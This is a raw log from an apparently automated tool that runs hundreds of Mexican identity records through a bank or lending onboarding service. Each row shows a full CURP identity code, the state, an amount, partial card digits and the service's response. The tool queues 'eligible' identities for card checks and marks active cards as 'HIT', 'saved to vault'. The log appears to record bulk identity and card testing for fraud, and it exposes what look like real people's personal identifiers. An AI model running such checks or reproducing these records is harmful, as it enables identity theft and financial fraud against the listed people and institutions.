[1624] ID:1143443 | ROCJ690430HCGDVS03 | $183,000 | COAHUILA | T:4311... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.4s)
[1625] ID:1415467 | GUGR831003HNLZRG06 | $183,000 | NUEVO LEON | T:5790... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[1626] ID:1646037 | CALM690611HDFRPR07 | $183,000 | CIUDAD DE ME | T:7422... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.8s)
[1627] ID:1753104 | RABS731212HMCMLL07 | $183,000 | ESTADO DE ME | T:3068... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:7422 para ID:1646037 ($183,000)... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.6s)
[1628] ID:1809899 | QUMC710604HCHNNS06 | $183,000 | CHIHUAHUA | T:8138... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.4s)
[1629] ID:1958313 | BEMZ841012MSORRR03 | $183,000 | SINALOA | T:6332... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (8.1s)
[1630] ID:2110879 | MOVR741009HVRRLF07 | $183,000 | VERACRUZ | T:8435... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.3s)
[1631] ID:2139343 | GACV710621MDFRVC03 | $183,000 | CIUDAD DE ME | T:7012... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[1632] ID:2439922 | SACA731223HBCLSM06 | $183,000 | BAJA CALIFOR | T:3053... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[1633] ID:2557365 | SETV730830MCPLRR08 | $183,000 | CAMPECHE | T:0229... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.3s)
[1634] ID:3013400 | MALM731113MNLCNY01 | $183,000 | NUEVO LEON | T:9780... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.0s)
[1635] ID:3390553 | BELA740604HMCLPN06 | $183,000 | ESTADO DE ME | T:4873... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[1636] ID:3634366 | GAMR710127MDFNNG03 | $183,000 | CIUDAD DE ME | T:2886... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.1s)
[1637] ID:3813146 | BEMI771013HJCRDG03 | $183,000 | JALISCO | T:4505... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:9780 para ID:3013400 ($183,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[1638] ID:4034450 | MOSF790924HDFRNR07 | $183,000 | CIUDAD DE ME | T:6503... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (14.2s)
[1639] ID:4322269 | ZAVJ711123HGRPRR02 | $183,000 | GUERRERO | T:8502... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.2s)
[1640] ID:4612434 | RAGP750629HQRMJD02 | $183,000 | QUINTANA ROO | T:4514... [🔴 OFF] Rechazo bancario (PE170) (12.1s)
[1641] ID:1235502 | MAVR700210MMNRCC00 | $182,980 | MICHOACAN | T:1282... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.4s)
[1642] ID:1952072 | RESA731108HDFYRL05 | $182,970 | CIUDAD DE ME | T:2530... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[1643] ID:3255541 | VAGX721130HDFLMR07 | $182,950 | CIUDAD DE ME | T:3194... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.9s)
[1644] ID:1775242 | CAVJ700514HDFLRR00 | $182,940 | CIUDAD DE ME | T:9376... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.9s)
[1645] ID:4818857 | MOEA731107HJCRSN06 | $182,910 | JALISCO | T:0550... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.6s)
[1646] ID:3870393 | GAMB730510HJCRRN01 | $182,820 | JALISCO | T:4747... [🔴 OFF] Contacto preexistente (/confirm-contact) (16.7s)
[1647] ID:2953309 | RACA690917HCMMSL00 | $182,720 | COLIMA | T:6736... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.0s)
[1648] ID:1475324 | NALJ741114HNLVDN02 | $182,710 | NUEVO LEON | T:6833... [🔴 OFF] Rechazo bancario (PE160) (13.6s)
[1649] ID:1293822 | RAMF700404MSPMNR00 | $182,700 | SAN LUIS POT | T:8649... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[1650] ID:2802398 | VIGV731224MCGLRR08 | $182,700 | COAHUILA | T:9696... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[1651] ID:4319537 | SAGG760715HDFCRN06 | $182,700 | CIUDAD DE ME | T:1940... [🔴 OFF] Rechazo bancario (PE170) (14.7s)
[1652] ID:4512808 | ROMG760711HJCSDB06 | $182,700 | JALISCO | T:7651... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.4s)
[1653] ID:4565137 | GACV710621MDFRVC03 | $182,700 | CIUDAD DE ME | T:9080... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.1s)
[1654] ID:804602 | CASR740111MMNHNC09 | $182,660 | MICHOACAN | T:0319... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:7651 para ID:4512808 ($182,700)... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (12.3s)
[1655] ID:3182624 | GOPV710206HJCNNC00 | $182,610 | JALISCO | T:8670... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.1s)
[1656] ID:3486882 | GAMM711110MQTLRR00 | $182,580 | QUERETARO | T:8704... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.2s)
[1657] ID:48514 | HEFL700614MTSRLT07 | $182,520 | TAMAULIPAS | T:0630... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.2s)
[1658] ID:1512730 | ROCC800605HJCMRR09 | $182,520 | JALISCO | T:7966... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.0s)
[1659] ID:3389900 | GUEC690125MJCTSL04 | $182,520 | JALISCO | T:8792... [🔴 OFF] Contacto preexistente (/confirm-contact) (15.2s)
[1660] ID:2722017 | PAMV740408HMNZRC08 | $182,460 | MICHOACAN | T:7751... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.4s)
[1661] ID:249426 | GARD711215HVRRBG09 | $182,440 | VERACRUZ | T:9908... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.1s)
[1662] ID:2538561 | HEGA720119HCHRMR00 | $182,430 | CHIHUAHUA | T:4437... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.9s)
[1663] ID:2188089 | LOVB741012MDFPRL08 | $182,400 | CIUDAD DE ME | T:2585... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.2s)
[1664] ID:3554069 | COCV701114HSORMC07 | $182,400 | SONORA | T:9387... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[1665] ID:2572191 | ROGY700602MDFBML05 | $182,350 | CIUDAD DE ME | T:5075... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (19.4s)
[1666] ID:2262364 | RUSC691208MCSZLN01 | $182,340 | CHIAPAS | T:4414... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:4437 para ID:2538561 ($182,430)... [🔴 OFF] Rechazo bancario (PE1002) (11.3s)
[1667] ID:4218809 | HEUA720403MMCRRL08 | $182,310 | ESTADO DE ME | T:2752... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[1668] ID:54045 | LOCC691124MTCPRR01 | $182,270 | TABASCO | T:3990... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.9s)
[1669] ID:3032002 | GAAG710731HBSRVR06 | $182,260 | BAJA CALIFOR | T:7191... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[1670] ID:327182 | BOZL691020HSOJZS08 | $182,250 | SONORA | T:2807... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:4414 para ID:2262364 ($182,340)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[1671] ID:1924185 | BERV901201HDFRMC06 | $182,250 | CIUDAD DE ME | T:0962... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.1s)
[1672] ID:2761995 | YEAR740928HDFSDB04 | $182,200 | CIUDAD DE ME | T:2780... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.2s)
[1673] ID:3178935 | OOAN010101HJCRRNA5 | $182,180 | JALISCO | T:5562... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[1674] ID:3403814 | RUMB710109HNLZNN05 | $182,170 | NUEVO LEON | T:1947... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.7s)
[1675] ID:1263658 | SABJ741223HDFLCN07 | $182,160 | CIUDAD DE ME | T:0724... [🔴 OFF] Contacto preexistente (/confirm-contact) (15.7s)
[1676] ID:2302858 | VAMC710906MDFRNL06 | $182,160 | CIUDAD DE ME | T:8251... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.7s)
[1677] ID:3689508 | LAMA690218MOCRNR06 | $182,160 | OAXACA | T:7583... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.7s)
[1678] ID:4380278 | PACH790901HMNLRL04 | $182,160 | MICHOACAN | T:5781... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.0s)
[1679] ID:4533327 | AIBA701211MNLRLD01 | $182,160 | NUEVO LEON | T:6284... [🔴 OFF] Rechazo bancario (PE170) (15.0s)
[1680] ID:4854705 | SAAE820530MDFNLL06 | $182,160 | CIUDAD DE ME | T:3336... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.8s)
[1681] ID:3221454 | VIPA710402MGTLDL01 | $182,100 | GUANAJUATO | T:9979... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.7s)
[1682] ID:394362 | PEHM750127MMNNRR06 | $182,090 | MICHOACAN | T:1867... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[1683] ID:4239491 | DILA730116HJCMPN08 | $182,090 | JALISCO | T:5064... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.0s)
[1684] ID:2769671 | CAMA730526MQTMRL06 | $182,070 | QUERETARO | T:7937... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.7s)
[1685] ID:4252873 | SAIA711103HGTNBL09 | $182,050 | GUANAJUATO | T:9547... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.0s)
[1686] ID:4216555 | FIRI730806HVRRZS08 | $182,040 | VERACRUZ | T:2854... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[1687] ID:360797 | HEVO770202HJCRLS08 | $182,000 | JALISCO | T:3850... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[1688] ID:396857 | ROCA700517HSPDRL08 | $182,000 | SAN LUIS POT | T:3275... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.9s)
[1689] ID:431083 | LEBE731020HJCLRN02 | $182,000 | JALISCO | T:4909... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:3850 para ID:360797 ($182,000)... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (20.8s)
[1690] ID:496696 | OOCA690505HNLRSB00 | $182,000 | NUEVO LEON | T:0464... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (19.9s)
[1691] ID:540710 | COHV791122HNLRRC00 | $182,000 | NUEVO LEON | T:5973... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.6s)
[1692] ID:588647 | DIPB731012MJCZNR05 | $182,000 | JALISCO | T:7880... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.4s)
[1693] ID:1256156 | HEVL761223HMCRRS01 | $182,000 | ESTADO DE ME | T:9589... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.9s)
[1694] ID:1333505 | CAFJ741015HCGSLN08 | $182,000 | COAHUILA | T:1604... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:7880 para ID:588647 ($182,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[1695] ID:1410097 | PERJ690706HHGNMR01 | $182,000 | HIDALGO | T:6874... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.0s)
[1696] ID:1411098 | BAJJ750706HBCLMN02 | $182,000 | BAJA CALIFOR | T:9825... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[1697] ID:1434920 | GAGJ791124HNLRNR08 | $182,000 | NUEVO LEON | T:9619... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[1698] ID:1489157 | GOLM730603HGTMLG01 | $182,000 | GUANAJUATO | T:2612... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.2s)
[1699] ID:2134594 | DAFO710415HMNMSS00 | $182,000 | MICHOACAN | T:1069... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.9s)
[1700] ID:2175943 | ROGJ690710HJCDNN05 | $182,000 | JALISCO | T:3244... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.5s)
[1701] ID:2206302 | FANL690528MJCJNT01 | $182,000 | JALISCO | T:4616... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.6s)
[1702] ID:2479368 | OETS830427MMNRLR03 | $182,000 | MICHOACAN | T:6033... [🔴 OFF] Rechazo bancario (PE160) (11.7s)
[1703] ID:2594111 | CAPJ741112HNLVRV01 | $182,000 | NUEVO LEON | T:0137... [🔴 OFF] Rechazo bancario (PE020) (10.3s)
[1704] ID:2632568 | OEBL780519HDFRSS03 | $182,000 | CIUDAD DE ME | T:0855... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[1705] ID:2634226 | PIAR701209HMSNGN01 | $182,000 | MORELOS | T:6109... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (15.9s)
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[1706] ID:2716534 | BACR710828HSORRD09 | $182,000 | SINALOA | T:6665... [1707] ID:3364425 | PABP000101HDFDRDA3 | $182,000 | CIUDAD DE ME | T:8586... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.1s)
[1708] ID:3509256 | SACM690204MASNMN05 | $182,000 | AGUASCALIENT | T:5648... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.3s)
[1709] ID:3968641 | ZULG690125HDFLCB09 | $182,000 | CIUDAD DE ME | T:5218... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (12.0s)
[1710] ID:4263505 | VERB720604MMNGML08 | $182,000 | MICHOACAN | T:5567... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.2s)
[1711] ID:4434395 | TIMJ720720HCSRNN01 | $182,000 | CHIAPAS | T:5864... [🔴 OFF] Contacto preexistente (/confirm-contact) (18.8s)
[1712] ID:4504617 | MELR710610MNLNNC07 | $182,000 | NUEVO LEON | T:7407... [🔴 OFF] Rechazo bancario (PE1002) (11.4s)
[1713] ID:4676458 | RABD730123MBCMBR07 | $182,000 | BAJA CALIFOR | T:9288... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.2s)
[1714] ID:4705493 | SABA721102MDFLRN04 | $182,000 | CIUDAD DE ME | T:1812... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.1s)
[1715] ID:4732145 | CAPM700726MBCRRY07 | $182,000 | BAJA CALIFOR | T:8872... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[1716] ID:1274607 | ROMA690320MDFMZL01 | $181,940 | CIUDAD DE ME | T:3081... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[1717] ID:2996848 | VEMR741114HCHLRB03 | $181,930 | CHIHUAHUA | T:0881... [🔴 OFF] Rechazo bancario (PE1002) (12.0s)
[1718] ID:4367456 | CARM690508HCHRDR00 | $181,830 | CHIHUAHUA | T:2750... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.5s)
[1719] ID:179107 | SAGA740428HSONRB07 | $181,800 | SINALOA | T:0106... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:0881 para ID:2996848 ($181,930)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[1720] ID:2050026 | EOMP690622HSOSYD03 | $181,800 | SINALOA | T:9118... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.5s)
[1721] ID:3718397 | MOOD711111HCHNLV04 | $181,750 | CHIHUAHUA | T:2994... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (3.6s)
[1722] ID:3912853 | SIRJ720607HGTLMN06 | $181,740 | GUANAJUATO | T:9177... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.9s)
[1723] ID:1007011 | SAMJ700624HYCNGN00 | $181,650 | YUCATAN | T:0197... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.7s)
[1724] ID:238331 | RIGA760405HOCCML05 | $181,630 | OAXACA | T:1819... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[1725] ID:2690766 | SALD740520MBCNXN07 | $181,630 | BAJA CALIFOR | T:5821... [🔴 OFF] Rechazo bancario (PE020) (12.1s)
[1726] ID:854256 | SAME750122HNLNRD05 | $181,610 | NUEVO LEON | T:6095... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (16.2s)
[1727] ID:4204028 | TEGG730118HMCRRR08 | $181,600 | ESTADO DE ME | T:3207... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (3.9s)
[1728] ID:4711003 | LARM760830HNLRNG07 | $181,590 | NUEVO LEON | T:6566... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.5s)
[1729] ID:148863 | KXCO000101HDFRHSA3 | $181,560 | CIUDAD DE ME | T:6781... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (14.8s)

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:6095 para ID:854256 ($181,610)... [1730] ID:2993042 | CAHR730626HJCHRD08 | $181,520 | JALISCO | T:6459... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[1731] ID:103375 | MALC711005MTLRPR00 | $181,500 | TLAXCALA | T:6375... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[1732] ID:316187 | LOSA730924MJCPSL01 | $181,500 | JALISCO | T:4244... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (15.0s)
[1733] ID:316317 | VIFA800923HGRLNL04 | $181,500 | GUERRERO | T:5719... [🔴 OFF] Contacto preexistente (/confirm-contact) (15.7s)
[1734] ID:361557 | CAML730306MGTLDR04 | $181,500 | GUANAJUATO | T:0296... [⚠️ RETRY] Timeout global de verificación (22s) (22.0s)
[1735] ID:382242 | JANE701206MNTMLL00 | $181,500 | NAYARIT | T:7062... [🔴 OFF] Rechazo bancario (400) (10.2s)
[1736] ID:382294 | VAMA740610HMNZGR00 | $181,500 | MICHOACAN | T:7281... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (15.3s)
[1737] ID:384945 | CANG710325HMNSVB03 | $181,500 | MICHOACAN | T:9214... [🔴 OFF] Rechazo bancario (PE020) (10.8s)
[1738] ID:385564 | RITA740221MTLSPN09 | $181,500 | TLAXCALA | T:4405... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.5s)
[1739] ID:389611 | TAOE711020MSOVLL01 | $181,500 | SINALOA | T:5634... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[1740] ID:415544 | DIVA710825HDGZZR03 | $181,500 | DURANGO | T:6128... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.2s)
[1741] ID:432494 | SACP690629HQRNND09 | $181,500 | QUINTANA ROO | T:2647... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[1742] ID:847203 | CURA760510HTLRMS01 | $181,500 | TLAXCALA | T:7545... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[1743] ID:895705 | GAHR771023HGTRRM06 | $181,500 | GUANAJUATO | T:8318... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.0s)
[1744] ID:1053904 | EUFA771026MCGSRL00 | $181,500 | COAHUILA | T:9521... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8318 para ID:895705 ($181,500)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[1745] ID:1205277 | SABL750721MNTNNL01 | $181,500 | NAYARIT | T:8771... [🔴 OFF] Rechazo bancario (PE170) (20.9s)
[1746] ID:1351343 | GAVJ730312HTSRZS06 | $181,500 | TAMAULIPAS | T:5692... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (15.1s)
[1747] ID:1389379 | PAAA710411HMSLYL06 | $181,500 | MORELOS | T:5544... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8771 para ID:1205277 ($181,500)... [🔴 OFF] Rechazo bancario (PE170) (14.3s)
[1748] ID:1472499 | RIRC740401MCGSLL01 | $181,500 | COAHUILA | T:1088... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.4s)
[1749] ID:1656419 | LOSE770519MJCPTM01 | $181,500 | JALISCO | T:9303... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (13.1s)
[1750] ID:1744168 | BEDE750409HSORJR09 | $181,500 | SONORA | T:3423... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.4s)
[1751] ID:1974922 | EIAM700817HNLLRR09 | $181,500 | NUEVO LEON | T:3179... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:9303 para ID:1656419 ($181,500)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (12.1s)
[1752] ID:2125335 | CAZJ721227HMSTMN01 | $181,500 | MORELOS | T:3571... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[1753] ID:2279045 | NUMF691102HDFNNR02 | $181,500 | CIUDAD DE ME | T:3442... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.7s)
[1754] ID:2354846 | VEVD730901HGRRLV08 | $181,500 | GUERRERO | T:7820... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.4s)

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:3179 para ID:1974922 ($181,500)... [1755] ID:2525345 | AUZA830127MJCGPL04 | $181,500 | JALISCO | T:1600... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (14.8s)
[1756] ID:2984819 | AUGI770615HCHNMV06 | $181,500 | CHIHUAHUA | T:8830... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.7s)
[1757] ID:3158664 | LOLC750301HMNPJR08 | $181,500 | MICHOACAN | T:4735... [🔴 OFF] Rechazo bancario (PE170) (14.6s)
[1758] ID:3211461 | ROAY730127MNLDLN04 | $181,500 | NUEVO LEON | T:1147... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (19.3s)
[1759] ID:3236114 | SACC811114HNLLVS09 | $181,500 | NUEVO LEON | T:7977... [🔴 OFF] Contacto preexistente (/confirm-contact) (19.2s)
[1760] ID:3386586 | GANG750531HGTLVR02 | $181,500 | GUANAJUATO | T:9370... [🔴 OFF] Rechazo bancario (PE170) (15.3s)
[1761] ID:3463242 | ZUDE780930MPLNLL00 | $181,500 | PUEBLA | T:1954... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[1762] ID:3554965 | CILB741006MCSHPL05 | $181,500 | CHIAPAS | T:1326... [🔴 OFF] Rechazo bancario (PE170) (13.9s)
[1763] ID:3726396 | MOMG690528HDFLRR01 | $181,500 | CIUDAD DE ME | T:1894... [🔴 OFF] Rechazo bancario (PE020) (10.4s)
[1764] ID:3915312 | BEEE731022MDFTLL09 | $181,500 | CIUDAD DE ME | T:2832... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.0s)
[1765] ID:4339253 | PIMA740205HYCNXR09 | $181,500 | YUCATAN | T:2599... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2832 para ID:3915312 ($181,500)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (15.7s)
[1766] ID:4490131 | GAGJ720609HTSRNS01 | $181,500 | TAMAULIPAS | T:3904... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.5s)
[1767] ID:4572729 | VELR750331HVRLPF03 | $181,500 | VERACRUZ | T:2209... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[1768] ID:4641911 | QUSR731102MTSNNS01 | $181,500 | TAMAULIPAS | T:5892... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1894 para ID:3726396 ($181,500)... [🔴 OFF] Rechazo bancario (PE170) (13.8s)
[1769] ID:4643993 | GADM740808HJCZRG03 | $181,500 | JALISCO | T:9448... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[1770] ID:4645928 | OEPR761113HJCRNM01 | $181,500 | JALISCO | T:4157... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.0s)
[1771] ID:4713601 | GAGL800731HZSRNS02 | $181,500 | ZACATECAS | T:7169... [🟢 HIT #8] Tarjeta ACTIVA Confirmada -> Guardado en bóveda!
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.9s)
[1772] ID:4759978 | GARC770525HTSRVR03 | $181,500 | TAMAULIPAS | T:2326... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:4157 para ID:4645928 ($181,500)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[1773] ID:2228265 | RIHM701018MSPVRN00 | $181,490 | SAN LUIS POT | T:2001... [🔴 OFF] Rechazo bancario (PE170) (15.4s)
[1774] ID:3002611 | ROTV700215HJCMHC01 | $181,480 | JALISCO | T:5036... [🟢 HIT #9] Tarjeta ACTIVA Confirmada -> Guardado en bóveda!
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (8.6s)
[1775] ID:666730 | SACS720122MDFMMS06 | $181,440 | CIUDAD DE ME | T:6393... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.4s)
[1776] ID:1048671 | HEFR741024HDGRRF08 | $181,440 | DURANGO | T:9643... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[1777] ID:1769196 | ROGM710727HDFDRG02 | $181,440 | CIUDAD DE ME | T:4828... [🔴 OFF] Rechazo bancario (PE160) (10.3s)
[1778] ID:742163 | SASK700923MNLNNR06 | $181,310 | NUEVO LEON | T:3570... [🔴 OFF] Rechazo bancario (PE170) (14.6s)
[1779] ID:2116341 | LORR740820HGRZMB04 | $181,300 | GUERRERO | T:3086... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (12.4s)
[1780] ID:165549 | MAOL690918MDFRSR00 | $181,280 | CIUDAD DE ME | T:8472... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (12.9s)
[1781] ID:1420774 | JIIA710115MJCMBM06 | $181,280 | JALISCO | T:7646... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
